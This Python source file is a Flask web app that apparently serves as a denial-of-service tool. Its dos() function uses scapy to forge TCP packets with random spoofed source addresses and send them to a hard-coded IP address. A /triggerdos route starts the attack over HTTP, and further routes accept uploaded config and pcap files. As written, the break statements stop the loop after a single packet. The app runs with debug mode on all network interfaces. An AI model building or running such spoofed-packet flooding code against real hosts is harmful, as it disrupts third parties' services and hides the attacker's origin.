
import os
# print (os.sys.path)
from flask import Flask, render_template, request
from werkzeug.utils import secure_filename
app = Flask(__name__)

import config

print (config.target_IP)

import random
from scapy.all import *
# from scapy.all import * as scapy

# from scapy.all import rdpcap
# pkts_list = rdpcap("pacp/http.cap")

def dos():
   global config

   target_IPs = "192.172.8.1"
   i = 1
   while True:
      a = str(random.randint(1,254))
      b = str(random.randint(1,254))
      c = str(random.randint(1,254))
      d = str(random.randint(1,254))
      dot = "."
      Source_ip = a + dot + b + dot + c + dot + d
      print(Source_ip)
      for source_port in range(1, 65535):
         IP1 = IP(src= Source_ip, dst = target_IPs)
         #TCP1 = TCP(sport = source_port, dport = 80)
         pkt = IP1 / TCP()
         send(pkt,inter = .001)
         print ("packet sent ", i)
         i = i + 1
         break
      break

# @app.route('/upload')
# def upload_file():
#    return render_template('upload.html')
	
@app.route('/config_uploader', methods = ['GET', 'POST'])
def upload_file_func():
   if request.method == 'POST':
      f = request.files['file']
      f.save(secure_filename(f.filename))
      return 'config file uploaded successfully'

@app.route('/pcap_uploader', methods = ['GET', 'POST'])
def upload_pcap_file_func():
   if request.method == 'POST': 
      f = request.files['file']
      f.save(secure_filename(f.filename))
      return 'pcap file uploaded successfully'

@app.route('/triggerdos')
def triggerdos():
    dos()
    return "DONE DOS"
		
@app.route('/')
def test():
    return "Welcome"

if __name__ == '__main__':
   #pass
   #dos()
   #print(sr1(IP(dst="112.135.35.246")/ICMP()).summary())
   app.run(host='0.0.0.0',debug = True)



